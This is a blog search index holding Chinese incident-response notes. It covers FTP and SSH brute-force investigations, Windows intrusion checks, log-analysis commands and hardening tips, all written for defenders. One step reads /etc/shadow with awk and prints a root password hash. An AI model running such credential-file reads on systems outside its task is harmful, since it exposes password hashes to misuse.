<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Emergency-Response-Notes README</title>
      <link href="/posts/c50485dc.html"/>
      <url>/posts/c50485dc.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍">项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录">项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析</p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析</p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持–隐藏篇</p></li><li><p>第2篇：Windows权限维持–后门篇</p></li><li><p>第3篇：Linux权限维持–隐藏篇</p></li><li><p>第4篇：Linux权限维持–后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流">学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass–，同时公众号提供了该项目的PDF版本，关注后回复&quot;应急响应&quot; 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第04章_Windows实战篇第1篇_FTP暴力破解</title>
      <link href="/posts/d61eb2b.html"/>
      <url>/posts/d61eb2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="第1篇：FTP暴力破解">第1篇：FTP暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="image/win-5-1.png" alt=""></p><h3 id="0x02-日志分析">0x02 日志分析</h3><p><strong>安全日志分析：</strong></p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="image/win-5-2.png" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="image/win-5-3.png" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong></p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。</p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="image/win-5-4.png" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="image/win-5-5.png" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="image/win-5-6.png" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="image/win-5-7.png" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器FTP默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第05章：Linux实战篇第1篇：SSH暴力破解</title>
      <link href="/posts/e4068ec3.html"/>
      <url>/posts/e4068ec3.html</url>
      
        <content type="html"><![CDATA[<h2 id="第1篇：SSH暴力破解">第1篇：SSH暴力破解</h2><h3 id="0x00-前言">0x00 前言</h3><p>​SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景">0x01 应急场景</h3><p>​某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131419092.png" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析">0x02 日志分析</h3><p>​SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">、</span>除root之外，是否还有其它特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk <span class="operator">-</span><span class="type">F</span>: &#x27;<span class="variable">$3</span><span class="operator">==</span><span class="number">0</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="operator">、</span>可以远程登录的帐号信息</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk &#x27;<span class="regexp">/\$1|\$6/</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>shadow</span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$38</span>cKfZDjsTiUe58V<span class="variable">$FP</span>.<span class="type">UHWMObqeUQS1Z2KRj</span><span class="regexp">/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./</span>qK12HN8jFuXOfEYIKLID6hq0::<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep -o <span class="string">&quot;Failed password&quot;</span> /var/log/secure|uniq -c</span><br><span class="line">     126254 Failed password</span><br><span class="line">     </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|head -1</span><br><span class="line">Jul  8 20:14:59 localhost sshd<span class="comment">[14323]</span>: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|tail -1</span><br><span class="line">Jul 10 12:37:21 localhost sshd<span class="comment">[2654]</span>: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</span><br><span class="line"></span><br><span class="line">3、进一步定位有哪些IP在爆破？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)\.(25<span class="subst">[0-5]</span>|2<span class="subst">[0-4]</span><span class="subst">[0-9]</span>|<span class="subst">[01]</span>?<span class="subst">[0-9]</span><span class="subst">[0-9]</span>?)&quot;</span>|uniq -c | sort -nr </span><br><span class="line">    12622 23.91.xxx.xxx</span><br><span class="line">     8942 114.104.xxx.xxx</span><br><span class="line">     8122 111.13.xxx.xxx</span><br><span class="line">     7525 123.59.xxx.xxx</span><br><span class="line">     ...................</span><br><span class="line">    </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line"><span class="comment">[root@localhost ~]</span># grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print <span class="string">&quot;$1\n&quot;</span>;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      9402  root</span><br><span class="line">      3265  invalid user oracle</span><br><span class="line">      1245  invalid user admin</span><br><span class="line">      1025  invalid user user</span><br><span class="line">      .....................</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>C、管理员最近登录情况：</strong></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、登录成功的日期、用户名、IP：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$1</span>,<span class="subst">$2</span>,<span class="subst">$3</span>,<span class="subst">$9</span>,<span class="subst">$11</span>&#125;&#x27;</span> </span><br><span class="line">Jul <span class="number">9</span> <span class="number">09</span>:<span class="number">38</span>:<span class="number">09</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">9</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">51</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">08</span>:<span class="number">54</span>:<span class="number">26</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">Jul <span class="number">10</span> <span class="number">16</span>:<span class="number">25</span>:<span class="number">59</span> root <span class="number">192.168</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">............................</span><br><span class="line">通过登录日志分析，并未发现异常登录时间和登录IP。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、顺便统计一下登录成功的IP有哪些：</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# grep <span class="string">&quot;Accepted &quot;</span> /<span class="keyword">var</span>/log/secure | awk <span class="string">&#x27;&#123;print <span class="subst">$11</span>&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br><span class="line">     <span class="number">27</span> <span class="number">192.168</span><span class="number">.204</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="0x04-处理措施">0x04 处理措施</h3><p>​SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器ssh默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
      <link href="/posts/dd41cd94.html"/>
      <url>/posts/dd41cd94.html</url>
      
        <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查">第1篇：windows 入侵排查</h2><h3 id="0x00-前言">0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路">0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全">1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-1.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入&quot;eventvwr.msc&quot;，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程">1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED</p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-3.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>  没有签名验证信息的进程  没有描述信息的进程  进程的属主  进程的路径是否合法  CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​c、查看进程对应的程序位置：</p><p>​任务管理器 – 选择对应进程 – 右键打开文件位置</p><p>​运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​d、<code>tasklist /svc</code>   进程 – PID – 服务</p><p>​e、查看Windows服务所对应的端口：</p><p>​%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务">1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-4.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息">1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line">  <span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀">1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析">1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开&quot;事件查看器&quot;。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇">0x02 工具篇</h3><h4 id="2-1-病毒分析">2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀">2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态">2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站">2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀">2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第02章：日志分析篇第1篇：Windows日志分析</title>
      <link href="/posts/68c6ad09.html"/>
      <url>/posts/68c6ad09.html</url>
      
